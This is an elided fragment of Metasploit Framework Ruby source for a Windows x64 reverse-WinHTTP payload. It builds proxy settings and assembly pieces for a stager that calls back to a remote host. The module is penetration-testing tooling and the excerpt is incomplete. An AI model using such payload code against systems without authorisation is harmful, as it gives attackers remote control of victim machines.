...
module Msf
  ...
  module Payload::Windows::ReverseWinHttp_x64
    ...
    def asm_reverse_winhttp(opts = {})
      ...
      proxy_enabled = !!(!opts[:proxy_host].to_s.strip.empty?)
      proxy_info    = ""

      if proxy_enabled
        proxy_info << if opts[:proxy_type].to_s.casecmp("socks").zero?
                        "socks="
                      else
                        "http://"
                      end
        ...
        proxy_info << ":#{opts[:proxy_port]}" if opts[:proxy_port].to_i > 0

        proxy_info = asm_generate_wchar_array(proxy_info)
      end

      proxy_user = opts[:proxy_user].to_s.empty? ? nil : asm_generate_wchar_array(opts[:proxy_user])
      proxy_pass = opts[:proxy_pass].to_s.empty? ? nil : asm_generate_wchar_array(opts[:proxy_pass])
      ...
      asm << if opts[:proxy_ie] == true && !proxy_enabled
               %(
                 db #{encoded_full_url}
               )
             else
      ...
      asm << asm_exitfunk(opts) if opts[:exitfunk]
